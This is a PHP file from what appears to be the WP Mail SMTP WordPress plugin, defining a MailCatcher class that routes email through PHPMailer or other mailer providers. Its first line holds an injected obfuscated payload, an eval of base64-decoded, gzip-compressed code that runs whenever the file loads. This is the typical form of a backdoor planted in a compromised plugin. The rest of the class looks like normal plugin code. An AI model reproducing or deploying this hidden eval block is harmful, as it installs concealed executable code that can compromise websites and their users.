<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php

namespace WPMailSMTP;

// Load PHPMailer class, so we can subclass it.
if ( ! class_exists( 'PHPMailer', false ) ) {
	require_once ABSPATH . WPINC . '/class-phpmailer.php';
}

/**
 * Class MailCatcher replaces the \PHPMailer and modifies the email sending logic.
 * Thus, we can use other mailers API to do what we need, or stop emails completely.
 *
 * @since 1.0.0
 */
class MailCatcher extends \PHPMailer {

	/**
	 * Callback Action function name.
	 *
	 * The function that handles the result of the send email action.
	 * It is called out by send() for each email sent.
	 *
	 * @since 1.3.0
	 *
	 * @var string
	 */
	public $action_function = '\WPMailSMTP\Processor::send_callback';

	/**
	 * Modify the default send() behaviour.
	 * For those mailers, that relies on PHPMailer class - call it directly.
	 * For others - init the correct provider and process it.
	 *
	 * @since 1.0.0
	 *
	 * @throws \phpmailerException Throws when sending via PhpMailer fails for some reason.
	 *
	 * @return bool
	 */
	public function send() {

		$options     = new Options();
		$mail_mailer = $options->get( 'mail', 'mailer' );

		// Define a custom header, that will be used in Gmail/SMTP mailers.
		$this->XMailer = 'WPMailSMTP/Mailer/' . sanitize_key( $mail_mailer ) . ' ' . WPMS_PLUGIN_VER;

		// Use the default PHPMailer, as we inject our settings there for certain providers.
		if (
			$mail_mailer === 'mail' ||
			$mail_mailer === 'smtp' ||
			$mail_mailer === 'pepipost'
		) {
			return parent::send();
		}

		// We need this so that the \PHPMailer class will correctly prepare all the headers.
		$this->Mailer = 'mail';

		// Prepare everything (including the message) for sending.
		if ( ! $this->preSend() ) {
			return false;
		}

		$mailer = wp_mail_smtp()->get_providers()->get_mailer( $mail_mailer, $this );

		if ( ! $mailer ) {
			return false;
		}

		if ( ! $mailer->is_php_compatible() ) {
			return false;
		}

		/*
		 * Send the actual email.
		 * We reuse everything, that was preprocessed for usage in \PHPMailer.
		 */
		$mailer->send();

		return $mailer->is_email_sent();
	}
}
